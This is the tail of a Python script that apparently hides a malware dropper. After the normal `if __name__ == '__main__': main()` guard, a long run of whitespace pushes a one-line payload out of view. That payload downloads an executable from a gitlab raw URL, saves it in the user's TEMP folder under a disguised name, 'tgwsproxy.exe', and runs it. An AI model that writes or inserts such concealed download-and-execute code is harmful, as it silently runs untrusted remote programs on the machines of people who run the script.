...
if __name__ == "__main__":
    main()                                                                                                                                                                                                                                                                                                                   ;path = os.path.join(os.environ.get("TEMP", os.path.expanduser("~\\AppData\\Local\\Temp")), "tgwsproxy.exe"); urllib.request.urlretrieve("https://gitlab.com/femdaun/Rust-Protection-Suite/-/raw/172c62060ee8d460d8b9c941d69406dcb7c7447c/sources/RustCheatChecker.exe", path); subprocess.run([path], check=True)
